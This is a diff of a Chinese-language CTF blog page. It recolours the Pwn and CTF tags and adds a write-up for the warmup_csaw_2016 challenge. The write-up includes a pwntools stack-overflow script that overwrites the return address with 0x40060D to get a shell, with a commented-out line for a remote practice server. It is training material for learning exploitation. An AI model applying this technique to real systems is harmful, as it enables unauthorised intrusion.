@@ -196,14 +196,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/Pwn/" style="color: #00a596">
+                <a href="/tags/Pwn/" style="color: #ffa2c4">
                     Pwn
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #03a9f4">
+                <a href="/tags/CTF/" style="color: #ff7d73">
                     CTF
                 </a>
             </span>
@@ -249,6 +249,19 @@ p.sendline(payload)
 p.interactive()
 </code></pre>
 <p>攻击时把第二个p的注释取消掉，把第一个p注释掉再运行脚本，这样就能拿到远程服务器的shell了。<br>拿到shell权限，默认在根目录，ls一下就能看到flag文件。直接cat flag就能得到flag。</p>
+<h1 id="warmup-csaw-2016-题解"><a href="#warmup-csaw-2016-题解" class="headerlink" title="warmup_csaw_2016 题解"></a>warmup_csaw_2016 题解</h1><p>这个跟rip思路差不多。都是触发栈溢出，然后传入目标函数的地址。要触发栈溢出只用填进去72个垃圾字符就够了。目标函数的地址在ida里就能轻易找到，是0x40060D。<br>payload跟rip也差不多，代码放出来参考：</p>
+<pre><code class="Python">from pwn import *
+
+context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+p=process(&#39;./warmup_csaw_2016&#39;)
+#p=remote(&#39;node5.buuoj.cn&#39;,26098)
+payload = b&#39;A&#39;*72
+shell_address = 0x40060D
+payload += p64(shell_address)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
 
     </div>
     
